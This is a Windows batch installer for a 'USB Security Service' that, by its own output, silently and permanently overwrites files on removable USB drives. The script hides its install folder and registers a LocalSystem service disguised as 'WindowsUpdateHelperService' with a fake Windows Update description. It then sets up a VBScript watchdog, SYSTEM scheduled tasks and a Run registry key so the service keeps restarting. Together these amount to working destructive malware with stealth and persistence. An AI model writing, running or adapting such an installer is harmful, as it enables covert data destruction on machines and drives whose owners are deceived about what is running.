@echo off
REM ============================================================================
REM USB Security Service - Complete Stealth Installation
REM Installs the service with maximum persistence and stealth operation
REM Creates GUI controller for configuration management
REM ============================================================================

setlocal enabledelayedexpansion

REM Check for Administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ============================================================================
    echo ERROR: This installer requires Administrator privileges!
    echo Please right-click and select "Run as Administrator"
    echo ============================================================================
    pause
    exit /b 1
)

echo ============================================================================
echo USB Security Service - Stealth Installation
echo ============================================================================
echo.

REM Get the directory where this batch file is located
set "BATCH_DIR=%~dp0"
cd /d "%BATCH_DIR%"

echo Current directory: %CD%
echo.

REM Set installation directory to hidden system folder
set "INSTALL_DIR=%ProgramData%\.system\WindowsUpdateHelper"
set "PYTHON_DIR=%INSTALL_DIR%\runtime"
set "SCRIPT_FILE=%INSTALL_DIR%\service.py"
set "CONTROLLER_FILE=%INSTALL_DIR%\usb_service_controller.py"
set "CONFIG_UTIL=%INSTALL_DIR%\configure_filter.py"
set "WATCHDOG_SCRIPT=%INSTALL_DIR%\watchdog.vbs"

REM Create installation directory
echo [1/8] Creating hidden installation directory...
if not exist "%ProgramData%\.system" (
    mkdir "%ProgramData%\.system"
    attrib +h "%ProgramData%\.system"
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +h +s "%INSTALL_DIR%"

echo Installation directory created: %INSTALL_DIR%
echo.

REM Check if service files exist
echo [2/8] Locating service files...
set "SERVICE_SOURCE=%BATCH_DIR%src\usb_audit_service.py"
set "CONTROLLER_SOURCE=%BATCH_DIR%src\usb_service_controller.py"
set "CONFIG_SOURCE=%BATCH_DIR%src\configure_filter.py"

if not exist "%SERVICE_SOURCE%" (
    echo ERROR: Service file not found: %SERVICE_SOURCE%
    pause
    exit /b 1
)

if not exist "%CONTROLLER_SOURCE%" (
    echo ERROR: Controller file not found: %CONTROLLER_SOURCE%
    pause
    exit /b 1
)

echo Found all required files.
echo.

REM Check for Python installation
echo [3/8] Checking Python installation...
python --version >nul 2>&1
if %errorLevel% equ 0 (
    echo Python is already installed system-wide.
    for /f "tokens=*" %%i in ('python --version 2^>^&1') do echo %%i
    set "PYTHON_CMD=python"
    set "PIP_CMD=python -m pip"
    set "USE_SYSTEM_PYTHON=1"
) else (
    echo Python not found. Installing embedded Python...
    set "USE_SYSTEM_PYTHON=0"
    
    REM Download Python embeddable package
    echo Downloading Python 3.11 embeddable...
    set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
    set "PYTHON_ZIP=%TEMP%\python-embed.zip"
    
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_ZIP%'}"
    
    if not exist "%PYTHON_ZIP%" (
        echo ERROR: Failed to download Python!
        pause
        exit /b 1
    )
    
    REM Extract Python
    echo Extracting Python to: %PYTHON_DIR%
    powershell -Command "& {Expand-Archive -Path '%PYTHON_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force}"
    del "%PYTHON_ZIP%"
    
    REM Configure Python embeddable to use pip
    echo Configuring Python...
    set "PTH_FILE=%PYTHON_DIR%\python311._pth"
    if exist "%PTH_FILE%" (
        echo import site>> "%PTH_FILE%"
    )
    
    REM Download get-pip.py
    echo Installing pip...
    set "GET_PIP=%PYTHON_DIR%\get-pip.py"
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '%GET_PIP%'}"
    
    REM Install pip
    "%PYTHON_DIR%\python.exe" "%GET_PIP%" --no-warn-script-location
    
    set "PYTHON_CMD=%PYTHON_DIR%\python.exe"
    set "PIP_CMD=%PYTHON_DIR%\python.exe -m pip"
)
echo.

REM Copy service files
echo [4/8] Installing service files...
copy /Y "%SERVICE_SOURCE%" "%SCRIPT_FILE%" >nul
copy /Y "%CONTROLLER_SOURCE%" "%CONTROLLER_FILE%" >nul
copy /Y "%CONFIG_SOURCE%" "%CONFIG_UTIL%" >nul

echo Service files installed successfully.
echo.

REM Install required Python packages
echo [5/8] Installing required Python packages...
echo Installing pywin32...
%PIP_CMD% install --break-system-packages pywin32 2>nul
if %errorLevel% neq 0 (
    echo Trying alternative installation method...
    %PIP_CMD% install --user pywin32 2>nul
    if !errorLevel! neq 0 (
        %PIP_CMD% install pywin32
    )
)

REM Run post-install script for pywin32
echo Configuring pywin32...
for /f "delims=" %%i in ('%PYTHON_CMD% -c "import sys; from pathlib import Path; print(Path(sys.executable).parent)"') do set "PYTHON_ROOT=%%i"

if exist "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" (
    %PYTHON_CMD% "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" -install >nul 2>&1
) else (
    %PYTHON_CMD% -c "import win32serviceutil" >nul 2>&1
    if !errorLevel! neq 0 (
        for /f "delims=" %%i in ('dir /s /b "%PYTHON_ROOT%\pywin32_postinstall.py" 2^>nul') do (
            %PYTHON_CMD% "%%i" -install >nul 2>&1
            goto :pywin32_done
        )
    )
)
:pywin32_done
echo.

REM Install and configure service
echo [6/8] Installing Windows service...
sc query WindowsUpdateHelperService >nul 2>&1
if %errorLevel% equ 0 (
    echo Service already exists. Removing old version...
    %PYTHON_CMD% "%SCRIPT_FILE%" stop >nul 2>&1
    timeout /t 2 /nobreak >nul
    %PYTHON_CMD% "%SCRIPT_FILE%" remove >nul 2>&1
    timeout /t 2 /nobreak >nul
)

echo Installing service...
%PYTHON_CMD% "%SCRIPT_FILE%" install
if %errorLevel% neq 0 (
    echo ERROR: Failed to install service!
    pause
    exit /b 1
)

echo Configuring service for stealth operation...
sc config WindowsUpdateHelperService start=auto >nul
sc config WindowsUpdateHelperService obj=LocalSystem >nul
sc config WindowsUpdateHelperService type=own >nul
sc failure WindowsUpdateHelperService reset=3600 actions=restart/5000/restart/5000/restart/5000 >nul
sc config WindowsUpdateHelperService depend=Tcpip >nul
sc description WindowsUpdateHelperService "Provides auxiliary support for Windows Update operations and system maintenance tasks" >nul

echo Service installed and configured for stealth operation.
echo.

REM Create stealth persistence mechanisms
echo [7/8] Creating stealth persistence mechanisms...

REM Create watchdog VBScript
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
echo Set objWMI = GetObject^("winmgmts:\\.\root\cimv2"^)
echo.
echo Do While True
echo     On Error Resume Next
echo     Set colServices = objWMI.ExecQuery^("SELECT * FROM Win32_Service WHERE Name='WindowsUpdateHelperService'"^)
echo     For Each objService in colServices
echo         If objService.State ^<^> "Running" Then
echo             objShell.Run "net start WindowsUpdateHelperService", 0, False
echo             WScript.Sleep 3000
echo         End If
echo     Next
echo     objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper", "net start WindowsUpdateHelperService", "REG_SZ"
echo     WScript.Sleep 15000
echo Loop
) > "%WATCHDOG_SCRIPT%"

REM Create scheduled tasks
schtasks /create /tn "WindowsUpdateHelperWatchdog" /tr "wscript.exe //B //Nologo \"%WATCHDOG_SCRIPT%\"" /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1
schtasks /create /tn "WindowsUpdateHelperDaily" /tr "net start WindowsUpdateHelperService" /sc daily /st 00:01 /ru SYSTEM /rl highest /f >nul 2>&1

REM Create registry entries
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "net start WindowsUpdateHelperService" /f >nul 2>&1

echo Stealth persistence mechanisms created.
echo.

REM Create desktop shortcut for controller
echo [8/8] Creating controller shortcut...
set "DESKTOP=%USERPROFILE%\Desktop"
set "SHORTCUT=%DESKTOP%\USB Security Controller.lnk"

(
echo Set oWS = WScript.CreateObject^("WScript.Shell"^)
echo sLinkFile = "%SHORTCUT%"
echo Set oLink = oWS.CreateShortcut^(sLinkFile^)
echo oLink.TargetPath = "%PYTHON_CMD%"
echo oLink.Arguments = """%CONTROLLER_FILE%"""
echo oLink.WorkingDirectory = "%INSTALL_DIR%"
echo oLink.Description = "USB Security Service Controller"
echo oLink.IconLocation = "shell32.dll,48"
echo oLink.Save
) > "%TEMP%\create_shortcut.vbs"

cscript //nologo "%TEMP%\create_shortcut.vbs" >nul 2>&1
del "%TEMP%\create_shortcut.vbs" >nul 2>&1

REM Start the service
echo Starting service...
%PYTHON_CMD% "%SCRIPT_FILE%" start 2>nul
if %errorLevel% neq 0 (
    net start WindowsUpdateHelperService 2>nul
)

REM Start watchdog
schtasks /run /tn "WindowsUpdateHelperWatchdog" >nul 2>&1

REM Verify service is running
timeout /t 3 /nobreak >nul
sc query WindowsUpdateHelperService | find "RUNNING" >nul
if %errorLevel% equ 0 (
    echo.
    echo ============================================================================
    echo SUCCESS! USB Security Service installed in STEALTH MODE
    echo ============================================================================
    echo.
    echo Service Name: Windows Update Helper Service
    echo Status: RUNNING (completely hidden)
    echo Installation: %INSTALL_DIR% (hidden)
    echo Controller: Desktop shortcut "USB Security Controller"
    echo.
    echo STEALTH FEATURES ENABLED:
    echo   ✓ Service runs completely invisible (no UI, no tray icons)
    echo   ✓ Automatic startup with Windows
    echo   ✓ Multiple watchdog mechanisms for persistence
    echo   ✓ Hidden installation directory
    echo   ✓ Disguised as Windows system service
    echo   ✓ Real-time USB monitoring and file overwriting
    echo.
    echo CURRENT CONFIGURATION:
    echo   Filter Mode: ALL FILES (maximum security)
    echo   Target: ALL files on removable USB drives
    echo   Ignored: Internal hard drives (C:, D:, etc.)
    echo.
    echo CONFIGURATION MANAGEMENT:
    echo   • Use desktop shortcut "USB Security Controller"
    echo   • Change filter modes: ALL, Office, PDF, Office+PDF
    echo   • Start/stop/restart service as needed
    echo   • Closing controller does NOT stop service
    echo.
    echo SERVICE OPERATION:
    echo   • Monitors removable USB drives only
    echo   • Overwrites files based on filter mode
    echo   • Real-time monitoring of file changes
    echo   • Silent operation (no notifications)
    echo   • Automatic recovery and persistence
    echo.
    echo ============================================================================
    echo.
    echo The service is now running in COMPLETE STEALTH MODE.
    echo Use the "USB Security Controller" shortcut to manage settings.
    echo.
    echo WARNING: Files on USB drives will be permanently overwritten!
    echo ============================================================================
) else (
    echo.
    echo WARNING: Service installed but may not be running.
    echo Please check the controller GUI for status.
)

echo.
echo Installation complete. Press any key to exit...
pause >nul
endlocal